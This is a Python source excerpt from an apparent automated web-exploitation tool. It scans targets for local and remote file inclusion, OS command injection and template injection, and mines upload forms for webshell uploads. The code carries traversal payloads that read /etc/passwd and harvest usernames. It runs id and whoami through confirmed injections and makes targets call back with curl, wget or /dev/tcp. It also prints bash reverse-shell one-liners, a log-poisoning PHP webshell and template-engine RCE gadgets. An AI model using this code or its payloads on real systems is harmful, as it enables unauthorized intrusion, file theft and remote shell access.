_LFI_PASSWD = ["/etc/passwd"] + ["../" * d + "etc/passwd" for d in range(1, 9)] + [
    "....//" * 6 + "etc/passwd",
    "..%2f" * 6 + "etc%2fpasswd",
    "..%252f" * 6 + "etc%252fpasswd",
    "/etc/passwd%00", "../" * 6 + "etc/passwd%00",
    "php://filter/resource=/etc/passwd",
]
_LFI_WIN = ["..\\" * 6 + "windows\\win.ini", "..%5c" * 6 + "windows%5cwin.ini",
            "C:\\windows\\win.ini"]
_LFI_ENVIRON = ["/proc/self/environ", "../" * 6 + "proc/self/environ"]
_LFI_PHPSRC = ["php://filter/convert.base64-encode/resource=index.php",
               "php://filter/read=convert.base64-encode/resource=index.php",
               "php://filter/convert.base64-encode/resource=index"]
_LFI_SIG_PASSWD = re.compile(r"^[a-zA-Z_][\w.-]*:[^:\n]*:\d+:\d+:", re.M)
_LFI_SIG_WIN = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I)
_LFI_SIG_ENVIRON = re.compile(r"PATH=|HTTP_HOST=|DOCUMENT_ROOT=|SERVER_SOFTWARE=")
_LFI_DEADLINE = 180
_LFI_THREADS = 8
_LFI_MAX_PARAMS = 20


def _gather_lfi_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path, param) with file-like params first (LFI most likely there)."""
    ts = _gather_sqli_targets(ip, port, proto)
    ts.sort(key=lambda t: 0 if _LFI_FILE_PARAM.search(t[2]) else 1)
    return ts[:_LFI_MAX_PARAMS]


def _tool_lfi_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: LFI / path traversal on file-like params (host + vhosts). Read-only
    payloads (traversal depths, URL/double-encoding, php:// wrappers, /proc, Windows); each
    hit is CONFIRMED by file-content signature (passwd line / win.ini / environ / base64→<?php)
    so a soft-error page can't cause a false positive. Auto-reads source via php://filter and
    harvests usernames from /etc/passwd; RCE (log poisoning etc.) is printed as a command,
    not run. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import base64
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path, param, payload):
        conn = None
        q = f"{path}?{param}={payload}"                       # payloads are pre-encoded — send raw
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=8)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(200000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test LFI")

    targets = _gather_lfi_targets(ip, port, proto)
    results = {}
    lock = threading.Lock()

    def _b64_php(body):
        for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", body or ""):
            try:
                dec = base64.b64decode(blob).decode("utf-8", "replace")
            except Exception:                                 # noqa: BLE001
                continue
            if "<?php" in dec or "<?=" in dec:
                return dec
        return None

    def _test(hostval, path, param):
        found = []
        # 1) /etc/passwd via traversal / wrappers
        for pl in _LFI_PASSWD:
            _st, body = _probe(hostval, path, param, pl)
            if body and _LFI_SIG_PASSWD.search(body):
                users = re.findall(r"^([a-zA-Z_][\w.-]*):[^:\n]*:\d+", body, re.M)
                found.append(("passwd", pl, users[:12]))
                break
        # 2) Windows win.ini
        for pl in _LFI_WIN:
            _st, body = _probe(hostval, path, param, pl)
            if body and _LFI_SIG_WIN.search(body):
                found.append(("win.ini", pl, []))
                break
        # 3) /proc/self/environ (RCE vector via UA poisoning)
        for pl in _LFI_ENVIRON:
            _st, body = _probe(hostval, path, param, pl)
            if body and _LFI_SIG_ENVIRON.search(body):
                found.append(("environ", pl, []))
                break
        # 4) php://filter source disclosure (auto-read, safe enumeration)
        for pl in _LFI_PHPSRC:
            _st, body = _probe(hostval, path, param, pl)
            src = _b64_php(body)
            if src:
                found.append(("php-src", pl, [src[:120].replace("\n", " ")]))
                break
        if found:
            with lock:
                results.setdefault(hostval, []).append((path, param, found))

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_LFI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    lines = [f"{scheme}://{ip}:{port}/ LFI / path traversal scan",
             f"params tested: {len(targets)} · "
             f"injectable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, found in results[hostval]:
                kinds = ", ".join(k for k, _p, _x in found)
                lines.append(f"  ✗ LFI {path}?{param}  ({kinds})")
                for kind, pl, extra in found:
                    if kind == "passwd":
                        lines.append(f"      /etc/passwd via {pl}")
                        if extra:
                            lines.append(f"      users: {', '.join(extra)}")
                    elif kind == "win.ini":
                        lines.append(f"      windows read via {pl}")
                    elif kind == "environ":
                        lines.append(f"      /proc/self/environ readable via {pl}")
                    elif kind == "php-src":
                        lines.append(f"      php://filter source readable ({pl})")
                        if extra:
                            lines.append(f"        {extra[0]}")
                url = f"{scheme}://{ip}:{port}{path}?{param}="
                lines.append(f"      RCE (manual): curl '{url}/var/log/apache2/access.log' "
                             f"-A '<?php system($_GET[0]);?>' ; then {url}/var/log/apache2/access.log&0=id")
    else:
        lines.append("\nno LFI / path traversal found")
    return "\n".join(lines)


_RFI_DEADLINE = 120
_RFI_THREADS = 8
_RFI_MAX_PARAMS = 20


def _tool_rfi_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: RFI / wrapper inclusion on file-like params (host + vhosts). Instead of
    hammering remote http (needs your server), it confirms inclusion/execution locally with a
    unique marker via data:// (plain + base64), php://input and expect://. A marker echoed
    WITHOUT the raw <?php text = code executed (allow_url_include on → RCE-capable); marker with
    raw code = wrapper included as text only. Non-destructive (echo marker); remote webshell is a
    printed command, not run. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import base64
    import random
    import string
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    marker = "pshRFI" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    php = f"<?php echo '{marker}'; ?>"
    b64 = base64.b64encode(php.encode()).decode()
    # each: (label, method, payload, reflect-literal) — the literal is what a plain reflection
    # of the payload would put around the marker; if it's in the body the marker was only
    # echoed back as TEXT (not executed). base64 hides the marker, so its plaintext = exec.
    payloads = [
        ("data://", "GET", f"data://text/plain,{php}", f"echo '{marker}'"),
        ("data://base64", "GET", f"data://text/plain;base64,{b64}", None),
        ("php://input", "POST", php, f"echo '{marker}'"),
        ("expect://", "GET", f"expect://echo {marker}", f"echo {marker}"),
    ]

    def _req(hostval, method, path, param, value, body=None):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=8)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if body is not None:
                hdr["Content-Type"] = "text/plain"
            conn.request(method, q, body=body, headers=hdr)
            resp = conn.getresponse()
            return resp.status, resp.read(100000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test RFI")

    targets = _gather_lfi_targets(ip, port, proto)[:_RFI_MAX_PARAMS]
    results = {}
    lock = threading.Lock()

    def _classify(body, lit):
        if not body or marker not in body:
            return None
        if "<?php" in body or (lit and lit in body):         # payload echoed back verbatim
            return "include"                                 # included/reflected as text, not run
        return "exec"

    def _test(hostval, path, param):
        # only EXEC is reliable RFI evidence — plain reflection of a data:// payload is just
        # reflection (XSS), not inclusion, so we don't report a text-only "include" verdict.
        for kind, method, data, lit in payloads:
            if method == "POST":
                r = _req(hostval, "POST", path, param, "php://input", body=data)
            else:
                r = _req(hostval, "GET", path, param, data)
            if _classify(r[1], lit) == "exec":
                # RCE confirmed → verify egress so the reverse-shell info is checked, not guessed
                def _run(c, _h=hostval, _p=path, _pa=param):
                    self_payload = f"data://text/plain,<?php system('{c}'); ?>"
                    _req(_h, "GET", _p, _pa, self_payload)
                cb = _verify_rce_callback(ip, _run)
                with lock:
                    results.setdefault(hostval, []).append((path, param, "exec", kind, cb))
                return

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_RFI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    lines = [f"{scheme}://{ip}:{port}/ RFI / wrapper inclusion scan",
             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, _verdict, via, cb in results[hostval]:
                lines.append(f"  ✗ RFI {path}?{param}  ({via} exec — RCE-capable; allow_url_include ON)")
                url = f"{scheme}://{ip}:{port}{path}?{param}="
                ok, addr = cb if cb else (False, None)
                if ok:
                    myip = addr.split(":")[0]
                    lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
                    rev = f"data://text/plain,<?php system('bash -c \"bash -i >%26 /dev/tcp/{myip}/4444 0>%261\"'); ?>"
                    lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}): "
                                 f"{url}{urllib.parse.quote(rev, safe='')}")
                else:
                    lines.append(f"      egress NOT confirmed (code-exec proven) — remote webshell: "
                                 f"{url}http://<YOUR_IP>/shell.txt # shell.txt = <?php system($_GET[0]);?>")
    else:
        lines.append("\nno RFI / wrapper inclusion found")
    return "\n".join(lines)


# OS command injection — params that often reach a shell, tested first.
_CMDI_SUSPECT = re.compile(
    r"host|ip|ping|cmd|exec|dns|domain|url|file|name|query|target|addr|command|run|"
    r"search|lookup|nslookup|trace|port", re.I)
_CMDI_DEADLINE = 240
_CMDI_THREADS = 6
_CMDI_REQ_TIMEOUT = 10
_CMDI_TIME_DELAY = 5
_CMDI_MAX_PARAMS = 20
_CMDI_MAX_TIME_PARAMS = 10


def _gather_cmdi_targets(ip: str, port: int, proto: str) -> list:
    ts = _gather_sqli_targets(ip, port, proto)
    ts.sort(key=lambda t: 0 if _CMDI_SUSPECT.search(t[2]) else 1)
    return ts[:_CMDI_MAX_PARAMS]


def _verify_rce_callback(target_ip: str, run_cmd, timeout: int = 8) -> "tuple":
    """Prove a confirmed RCE can reach us back (so a reverse shell will work) WITHOUT giving a
    shell: open a short-lived listener, have the target hit it via run_cmd (a closure that runs
    a shell command through the vector), wait for the marked connection, tear it down. Returns
    (ok, "ip:port"). ip is our address the target actually routed to."""
    import socket
    import threading
    import random
    import string
    try:                                                     # our source IP toward the target
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.connect((target_ip, 9))
        myip = u.getsockname()[0]
        u.close()
    except Exception:                                        # noqa: BLE001
        return False, None
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(timeout)
    except Exception:                                        # noqa: BLE001
        return False, None
    cbport = srv.getsockname()[1]
    marker = "pshCB" + "".join(random.choices(string.ascii_lowercase, k=6))
    got = {"ok": False}

    def _accept():
        try:
            conn, _ = srv.accept()
            data = conn.recv(2048)
            if marker.encode() in data:
                got["ok"] = True
            try:                                             # reply so the target's curl/wget returns
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            except Exception:                                # noqa: BLE001
                pass
            conn.close()
        except Exception:                                    # noqa: BLE001
            pass

    th = threading.Thread(target=_accept, daemon=True)
    th.start()
    url = f"http://{myip}:{cbport}/{marker}"
    for c in (f"curl -s {url}", f"wget -qO- {url}",
              f"python3 -c \"import urllib.request as u;u.urlopen('{url}')\"",
              f"exec 3<>/dev/tcp/{myip}/{cbport}; echo -e 'GET /{marker} HTTP/1.0\\r\\n\\r\\n' >&3"):
        try:
            run_cmd(c)
        except Exception:                                    # noqa: BLE001
            pass
        th.join(timeout=max(2, timeout // 3))
        if got["ok"]:
            break
    try:
        srv.close()
    except Exception:                                        # noqa: BLE001
        pass
    return got["ok"], f"{myip}:{cbport}"


# command-injection separators, shared by cmdi-scan (detection) and foothold (which rebuilds
# the exact wrapper from the label cmdi-scan recorded in the DB). CMD is spliced into the value.
_CMDI_WRAPS = [
    ("; ", lambda c: f"1;{c}"),
    ("| ", lambda c: f"1|{c}"),
    ("&& ", lambda c: f"1&&{c}"),
    ("$(...)", lambda c: f"1$({c})"),
    ("`...`", lambda c: f"1`{c}`"),
    ("newline", lambda c: f"1\n{c}"),
]
_CMDI_TIME_WRAPS = [
    ("; sleep", lambda n: f"1;sleep {n}"),
    ("| sleep", lambda n: f"1|sleep {n}"),
    ("&& sleep", lambda n: f"1&&sleep {n}"),
    ("$(sleep)", lambda n: f"1$(sleep {n})"),
    ("`sleep`", lambda n: f"1`sleep {n}`"),
    ("& ping(win)", lambda n: f"1&ping -n {n + 1} 127.0.0.1"),
]


def _tool_cmdi_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: OS command injection on params (host + vhosts). Output-based uses a
    COMPUTED marker (echo pshOS$((a+b))) so only real shell arithmetic — not a reflected
    payload — counts (near-zero FP); time-based (sleep / ping) with a control + confirm catches
    the blind case. On an output-based hit it auto-runs read-only id / whoami / uname / hostname
    to prove RCE and show privilege. Reverse shell is a printed command, not run. Stdlib only."""
    import http.client
    import ssl
    import time
    import random
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    deadline = time.time() + _CMDI_DEADLINE

    wraps = _CMDI_WRAPS
    time_wraps = _CMDI_TIME_WRAPS

    def _get(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        t0 = time.perf_counter()
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_CMDI_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_CMDI_REQ_TIMEOUT)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(100000).decode("utf-8", "replace"), time.perf_counter() - t0
        except Exception:                                     # noqa: BLE001
            return None, None, time.perf_counter() - t0
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _get(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test cmd injection")

    targets = _gather_cmdi_targets(ip, port, proto)
    results = {}
    lock = threading.Lock()
    time_pool = []

    def _test_output(hostval, path, param):
        a, b = random.randint(1000, 9000), random.randint(1000, 9000)
        token = f"pshOS{a + b}zz"
        cmd = f"echo pshOS$(({a}+{b}))zz"
        for label, wrap in wraps:
            if time.time() >= deadline:
                return None
            _st, body, _el = _get(hostval, path, param, wrap(cmd))
            if body and token in body:                        # computed → shell ran it
                return (label, wrap)
        return None

    def _run(hostval, path, param, wrap, cmd):
        dm = "pshE" + "".join(random.choices("abcdef0123456789", k=6))
        _st, body, _el = _get(hostval, path, param, wrap(f"echo {dm}$({cmd}){dm}"))
        m = re.search(re.escape(dm) + r"(.*?)" + re.escape(dm), body or "", re.S)
        return " ".join(m.group(1).split())[:120] if m else None

    def _test_time(hostval, path, param):
        lat = min(_get(hostval, path, param, "1")[2], _get(hostval, path, param, "1")[2])
        for label, tpl in time_wraps:
            if time.time() >= deadline:
                return None
            c_el = _get(hostval, path, param, tpl(0))[2]
            t_el = _get(hostval, path, param, tpl(_CMDI_TIME_DELAY))[2]
            if t_el >= _CMDI_TIME_DELAY * 0.7 and (t_el - max(lat, c_el)) >= _CMDI_TIME_DELAY * 0.6:
                t2 = _get(hostval, path, param, tpl(_CMDI_TIME_DELAY))[2]
                if t2 >= _CMDI_TIME_DELAY * 0.7:
                    return label
        return None

    def _test(hostval, path, param):
        hit = _test_output(hostval, path, param)
        if hit:
            label, wrap = hit
            enum = [(n, _run(hostval, path, param, wrap, c))
                    for n, c in (("id", "id"), ("whoami", "whoami"),
                                 ("uname", "uname -a"), ("host", "hostname"))]
            # verify egress through the CONFIRMED separator only (one callback, not all six)
            cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, wrap(c)))
            with lock:
                results.setdefault(hostval, []).append((path, param, "echo", label, enum, cb))
            return
        with lock:
            time_pool.append((hostval, path, param))          # try time-based later (sequential)

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_CMDI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    for hostval, path, param in time_pool[:_CMDI_MAX_TIME_PARAMS]:   # timing-sensitive → sequential
        if time.time() >= deadline:
            break
        lbl = _test_time(hostval, path, param)
        if lbl:                                               # blind: run commands via the ';' separator
            cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, wraps[0][1](c)))
            results.setdefault(hostval, []).append((path, param, "time", lbl, None, cb))

    lines = [f"{scheme}://{ip}:{port}/ OS command injection scan",
             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, kind, label, enum, cb in results[hostval]:
                lines.append(f"  ✗ CMDI {path}?{param}  ({kind}-based, {label})")
                if enum:
                    for n, val in enum:
                        if val:
                            lines.append(f"      {n}: {val}")
                else:
                    lines.append("      blind (no output reflected)")
                ok, addr = cb if cb else (False, None)
                if ok:
                    myip = addr.split(":")[0]
                    lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
                    lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}, then run): "
                                 f"1;bash -c 'bash -i >& /dev/tcp/{myip}/4444 0>&1'")
                else:
                    lines.append("      egress NOT confirmed (RCE proven above; outbound may be firewalled) — "
                                 "reverse shell: 1;bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'")
    else:
        lines.append("\nno OS command injection found")
    return "\n".join(lines)


# SSTI: template syntaxes for the math probe, then per-family RCE gadgets (run a command).
_SSTI_SYNTAX = [
    ("{{ }}", lambda e: "{{" + e + "}}"),
    ("${ }", lambda e: "${" + e + "}"),
    ("#{ }", lambda e: "#{" + e + "}"),
    ("<%= %>", lambda e: "<%= " + e + " %>"),
    ("{ }", lambda e: "{" + e + "}"),
    ("@( )", lambda e: "@(" + e + ")"),
]
# family -> [(engine, gadget(cmd) -> payload)] — gadgets run a shell command via the engine
_SSTI_GADGETS = {
    "{{ }}": [
        ("Jinja2", lambda c: "{{cycler.__init__.__globals__.os.popen('" + c + "').read()}}"),
        ("Jinja2", lambda c: "{{lipsum.__globals__.os.popen('" + c + "').read()}}"),
        ("Twig", lambda c: "{{['" + c + "']|filter('system')}}"),
        ("Nunjucks", lambda c: "{{range.constructor(\"return global.process.mainModule."
                               "require('child_process').execSync('" + c + "')\")()}}"),
    ],
    "${ }": [
        ("Freemarker", lambda c: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + c + '")}'),
        ("Mako", lambda c: "${__import__('os').popen('" + c + "').read()}"),
        ("Smarty", lambda c: "${system('" + c + "')}"),
    ],
    "<%= %>": [
        ("ERB", lambda c: "<%= `" + c + "` %>"),
        ("ERB", lambda c: "<%= IO.popen('" + c + "').read %>"),
    ],
    "{ }": [
        ("Smarty", lambda c: "{system('" + c + "')}"),
        ("Smarty", lambda c: "{php}system('" + c + "');{/php}"),
    ],
}
_SSTI_DEADLINE = 150
_SSTI_THREADS = 8
_SSTI_MAX_PARAMS = 20


def _tool_ssti_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step tool: server-side template injection. A COMPUTED math marker ({{a*b}} etc.)
    across template syntaxes confirms evaluation (not reflection) with near-zero FP; then, for
    the matching syntax family, engine RCE gadgets run a read-only `id` — a `uid=` in the reply
    confirms RCE and identifies the engine. The findings carry a confirmed command-execution
    one-liner (swap `id` for anything). Only a reverse shell needs your listener. Stdlib only."""
    import http.client
    import ssl
    import time
    import random
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    deadline = time.time() + _SSTI_DEADLINE

    def _get(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=8)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(100000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _get(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test SSTI")

    targets = _gather_sqli_targets(ip, port, proto)[:_SSTI_MAX_PARAMS]
    results = {}
    lock = threading.Lock()

    def _test(hostval, path, param):
        a, b = random.randint(100, 999), random.randint(100, 999)
        prod, expr = str(a * b), f"{a}*{b}"
        family = None
        for fam, mk in _SSTI_SYNTAX:
            if time.time() >= deadline:
                return
            _st, body = _get(hostval, path, param, mk(expr))
            if body and prod in body and expr not in body:    # computed → template evaluated
                family = fam
                break
        if not family:
            return
        engine, idout, run_gadget, cb = None, None, None, None
        for eng, gad in _SSTI_GADGETS.get(family, []):
            if time.time() >= deadline:
                break
            _st, body = _get(hostval, path, param, gad("id"))
            m = re.search(r"uid=\d+\([^)]*\)[^\n<]*", body or "")
            if m:
                engine, idout, run_gadget = eng, m.group(0).strip(), gad
                cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, run_gadget(c)))
                break
        with lock:
            results.setdefault(hostval, []).append((path, param, family, engine, idout, run_gadget, cb))

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_SSTI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    lines = [f"{scheme}://{ip}:{port}/ SSTI (server-side template injection) scan",
             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, family, engine, idout, gad, cb in results[hostval]:
                url = f"{scheme}://{ip}:{port}{path}?{param}="
                if engine and gad:
                    lines.append(f"  ✗ SSTI {path}?{param}  ({family} → {engine}, RCE confirmed)")
                    lines.append(f"      id: {idout}")
                    cmd_payload = urllib.parse.quote(gad("$CMD"), safe="")
                    lines.append(f"      run any cmd: curl '{url}{cmd_payload}'  "
                                 f"# replace $CMD with your command (confirmed via id above)")
                    ok, addr = cb if cb else (False, None)
                    if ok:
                        myip = addr.split(":")[0]
                        rev = gad(f"bash -c 'bash -i >& /dev/tcp/{myip}/4444 0>&1'")
                        lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
                        lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}): "
                                     f"curl '{url}{urllib.parse.quote(rev, safe='')}'")
                    else:
                        rev = gad("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'")
                        lines.append(f"      egress NOT confirmed (RCE proven above) — reverse shell: "
                                     f"curl '{url}{urllib.parse.quote(rev, safe='')}' # set YOUR_IP + nc -lvnp 4444")
                else:
                    lines.append(f"  ⚠ SSTI {path}?{param}  ({family} evaluated — engine RCE gadget "
                                 f"not auto-confirmed; try engine-specific payloads)")
    else:
        lines.append("\nno SSTI found")
    return "\n".join(lines)


# ── HTTP step 21: file-upload → webshell (PHP only; exec-verified, non-destructive) ──
_UPLOAD_DEADLINE = 300          # s — hard wall-clock cap over all forms/variants
_UPLOAD_REQ_TIMEOUT = 10
_UPLOAD_MAX_FORMS = 12          # distinct upload surfaces to probe
_UPLOAD_PATH_RE = re.compile(
    r"upload|avatar|profile|import|attach|media|photo|gallery|file", re.I)
# common upload endpoints to try when nothing was mined by earlier steps (per host + vhost)
_UPLOAD_FALLBACK_PATHS = [
    "/upload", "/upload.php", "/uploads", "/admin/upload", "/admin/upload.php",
    "/profile", "/profile.php", "/account", "/avatar", "/avatar.php",
    "/import", "/import.php", "/file", "/files", "/attachment", "/attachments",
    "/media", "/gallery", "/photo", "/settings",
]
# where a stored file is commonly reachable from, checked when the response doesn't leak a URL
_UPLOAD_STORE_DIRS = [
    "/uploads/", "/upload/", "/files/", "/file/", "/images/", "/img/", "/media/",
    "/avatars/", "/avatar/", "/attachments/", "/userfiles/", "/data/", "/assets/",
    "/content/", "/tmp/", "/",
]


def _parse_upload_form(html: str, page_path: str) -> "dict | None":
    """Pull a multipart upload <form> (the one with a file input): its action, method, the
    file field name, and the other fields (hidden CSRF tokens + required text) to echo back."""
    for form in re.findall(r"<form[^>]*>.*?</form>", html or "", re.I | re.S):
        if not re.search(r"type=[\"']?file", form, re.I):
            continue
        fm = re.search(r"<form[^>]*>", form, re.I)
        fmt = fm.group(0) if fm else ""
        file_m = re.search(r"<input[^>]*type=[\"']?file[\"']?[^>]*name=[\"']([^\"']+)", form, re.I) or \
            re.search(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']?file", form, re.I)
        if not file_m:
            continue
        act = re.search(r"action=[\"']([^\"']*)[\"']", fmt, re.I)
        method = re.search(r"method=[\"']?(\w+)", fmt, re.I)
        fields = {}
        for tag in re.findall(r"<input[^>]*>", form, re.I):
            tp = re.search(r"type=[\"']?(\w+)", tag, re.I)
            tp = tp.group(1).lower() if tp else "text"
            nm = re.search(r"name=[\"']([^\"']+)", tag, re.I)
            if not nm or tp == "file":
                continue
            nm = nm.group(1)
            vv = re.search(r"value=[\"']([^\"']*)", tag, re.I)
            if tp in ("hidden", "text", "email", "search", "url", "submit"):
                fields[nm] = vv.group(1) if vv else ("pshunter" if tp != "submit" else "1")
        return {"action": act.group(1) if act else "", "file": file_m.group(1),
                "method": (method.group(1).upper() if method else "POST"), "fields": fields}
    return None


def _gather_upload_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path) upload surfaces — dir-brute paths that look like an upload/profile page,
    plus common fallback paths, on the host and every discovered vhost."""
    tgts, seen = [], set()

    def _add(hostval, path):
        base = path.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        key = (hostval, base)
        if key not in seen:
            seen.add(key)
            tgts.append((hostval, base))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("dir-brute", "manual-paths"):
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp and _UPLOAD_PATH_RE.search(mp.group(1)):
                    _add(host, mp.group(1))

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in _UPLOAD_FALLBACK_PATHS:
            _add(h, p)
    return tgts[:_UPLOAD_MAX_FORMS]


def _detect_web_langs(ip: str, port: int, proto: str) -> list:
    """Which server-side language(s) to target, inferred from the fingerprint (services +
    earlier http-* output): ASP/.NET on IIS, JSP on Tomcat/Java, PHP otherwise. Returns an
    ordered list — the detected stack first — so the upload tool auto-switches its payload."""
    blob = ""
    for (nm, prod, _ver, cpe) in fetch_services(ip).values():
        blob += " ".join(x for x in (nm, prod, cpe) if x).lower() + " "
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("http-headers", "http-fingerprint", "http-source"):
            blob += " " + (output or "").lower()
    langs = []
    if re.search(r"asp\.net|microsoft-iis|\biis\b|x-aspnet|x-powered-by:\s*asp|\.aspx?\b", blob):
        langs.append("asp")
    if re.search(r"tomcat|coyote|\bjsp\b|jboss|jetty|wildfly|glassfish|servlet|\bjava\b", blob):
        langs.append("jsp")
    if re.search(r"\bphp\b|x-powered-by:\s*php|\.php\b", blob) or not langs:
        langs.append("php")                                   # default when nothing else matched
    return langs


